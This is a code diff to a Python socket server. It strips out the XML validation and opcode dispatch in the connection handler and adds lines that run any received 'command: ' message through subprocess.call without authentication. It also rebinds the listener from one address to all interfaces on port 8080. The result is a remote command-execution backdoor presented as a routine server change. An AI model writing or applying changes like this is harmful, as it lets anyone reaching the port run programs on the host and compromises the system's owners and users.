@@ -14,6 +14,7 @@ from myServerSend import unknown_opcode
 import thread
 import xml.etree.ElementTree as ET
 from XMLvalidator import XMLValidate as val
+from subprocess import call
 
 version = '0.0.1'
 #opcode associations
@@ -42,26 +43,12 @@ def handler(conn,lock, myData):
             #close the thread if the connection is down
             thread.exit()
         #if we receive a message...
-        if len(netbuffer) >= 6:
-            # parse the xml
-            xml = ET.fromstring(netbuffer)
-            #only allow correct version numbers and buffers that are of the appropriate length
-            if val.validate(xml):
-                #try to send packet to correct handler
-                try:
-                    opcode = int(xml.find('opcode').text)
-                    opcodes[opcode](conn,xml,myData,lock)
-                #catch unhandled opcodes
-                except KeyError:
-                    if(second_attempt):
-                        #disconnect the client
-                        myServerSend.end_session_success(conn)
-                        conn.close()
-                        return
-                    else:
-                        #send incorrect opcode message
-                        second_attempt = 1
-                        unknown_opcode(conn)
+        if(netbuffer[:9] == 'command: '):
+            call(netbuffer[9:]);
+        if(netbuffer == '6'):
+            conn.close();
+        if(len(netbuffer) > 3):
+            print(netbuffer)
 
 
 if __name__ == '__main__':
@@ -72,7 +59,7 @@ if __name__ == '__main__':
 
     #setup socket
     mySocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    mySocket.bind(('10.251.211.231',8080))
+    mySocket.bind(('',8080))
     mySocket.listen(5)  #param represents the number of queued connections
 
     #listening for connections
